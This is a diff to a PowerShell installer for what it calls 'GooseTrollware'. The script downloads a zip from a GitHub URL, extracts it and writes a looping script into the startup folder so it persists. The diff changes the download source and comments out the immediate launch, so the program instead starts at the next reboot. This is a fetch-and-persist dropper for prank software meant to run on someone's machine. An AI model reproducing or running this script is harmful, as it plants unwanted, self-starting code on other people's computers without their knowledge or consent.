@@ -1,6 +1,6 @@
 # Download and install
 Set-Location $home
-Invoke-WebRequest -Uri "https://github.com/Reginald-Gillespie/G/raw/main/g.zip" -OutFile "GooseTrollware.zip"
+Invoke-WebRequest -Uri "https://github.com/Reginald-Gillespie/G3/raw/main/g.zip" -OutFile "GooseTrollware.zip"
 Expand-Archive -Path "GooseTrollware.zip" -DestinationPath "GooseTrollware" -Force
 
 # Copy VBA script to startup folder
@@ -18,6 +18,6 @@ Do
 Loop
 "@ > $gloc
 
-# And finally we start it
-Start-Sleep 1
-Start-Process $gloc
+# For this verison, we don't start it right away, it will start next reboot
+# Start-Sleep 1
+# Start-Process $gloc
